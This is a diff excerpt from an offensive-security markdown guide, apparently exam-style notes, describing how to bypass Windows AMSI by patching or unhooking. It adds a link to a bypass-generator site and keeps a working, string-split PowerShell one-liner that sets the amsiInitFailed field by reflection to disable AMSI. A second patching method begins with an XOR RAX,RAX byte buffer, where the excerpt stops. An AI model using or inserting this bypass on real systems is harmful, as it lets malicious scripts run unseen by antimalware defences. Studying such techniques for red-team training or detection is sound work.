@@ -126,13 +126,18 @@ There are two methods to bypass AMSI:
 - Patching 
 - Unhooking
 
+Nice resource to have:
+- https://amsi.fail/ 
+
+
 #### 1.2.1 Method 1
-Patching template is what Offensive-Security teaches in OSEP with some small changes. The execution of 1st method (Patching) is straight forward and uses well-known methodologies.
+The execution of 1st method (Patching) is straight forward and uses well-known methodologies.
 
 ```
 $m="System.Management.Automation.Ams";[Ref].Assembly.GetType("$m"+"iUtils").GetField('amsiInitFai'+'led','NonPublic,Static').SetValue($null,$true)
 ```
 
+OR you can patch AMSI as follows.
 ```
 # XOR RAX,RAX 
 $buf = [Byte[]] (0x48,0x31,0xC0)  
